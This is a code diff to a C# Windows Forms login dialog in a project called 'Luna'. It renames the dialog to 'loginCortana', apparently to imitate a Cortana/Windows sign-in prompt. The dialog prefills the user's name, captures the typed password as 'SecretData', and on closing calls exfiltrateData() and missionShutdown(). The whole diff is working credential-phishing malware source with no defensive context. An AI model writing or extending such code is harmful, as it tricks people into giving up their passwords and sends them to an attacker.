@@ -24,7 +24,7 @@ using System.Windows.Forms;
 
 namespace Luna
 {
-    public partial class loginDialog : Form
+    public partial class loginCortana : Form
     {
         string _userID;
         string _password;
@@ -32,10 +32,10 @@ namespace Luna
 
         public string userID
         {
-            set 
-            { 
+            set
+            {
                 _userID = value;
-                this.loginUser.Text = _userID;
+                this.txtUser.Text = _userID;
             }
 
             get { return _userID; }
@@ -46,14 +46,14 @@ namespace Luna
             set
             {
                 _password = value;
-                this.loginPassword.Text = _password;
+                this.txtPassword.Text = _password;
                 _frmParent.SecretData = _password;
             }
 
             get { return _password; }
         }
 
-        public loginDialog(missionRun frmParent)
+        public loginCortana(missionRun frmParent)
         {
             _frmParent = frmParent;
             _userID = Environment.UserName;
@@ -62,14 +62,14 @@ namespace Luna
             InitializeComponent();
         }
 
-        private void loginDialog_Activated(object sender, EventArgs e)
+        private void loginCortana_Activated(object sender, EventArgs e)
         {
-            this.loginPassword.Focus();
+            this.txtPassword.Focus();
         }
 
-        private void loginPassword_Validated(object sender, EventArgs e)
+        private void loginCortana_Validated(object sender, EventArgs e)
         {
-            this.password = loginPassword.Text; 
+            this.password = txtPassword.Text;
         }
 
         // Excellent stackoverflow solution to an annoying problem:
@@ -101,6 +101,11 @@ namespace Luna
             Application.DoEvents();
             _frmParent.exfiltrateData();
             _frmParent.missionShutdown();
+        }
+
+        private void txtPassword_Validated(object sender, EventArgs e)
+        {
+            this.password = txtPassword.Text;
         }
     }
 }
